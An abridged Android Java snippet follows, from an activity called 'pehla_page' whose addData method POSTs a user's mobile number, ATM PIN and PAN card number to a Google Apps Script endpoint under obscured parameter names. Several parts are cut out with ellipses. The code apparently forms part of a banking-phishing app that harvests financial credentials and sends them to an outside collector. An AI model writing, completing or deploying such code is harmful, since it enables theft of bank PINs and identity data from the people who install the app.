...
public class pehla_page extends AppCompatActivity {
    ...
    private void addData() {
        ...
        StringRequest stringRequest=new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbx4tymixtmudEvRsOw1p7J1dN26irSDeQQp3hHv5zswABpL8rWM-vi7yYEMguXszES4/exec", new Response.Listener<String>() {
            @Override
            ...
            protected Map<String,String> getParams(){
                ...
                params.put("vA",mobile);
                params.put("vB",atmPin);
                params.put("vC",panCard);
                return params;
            }
        };
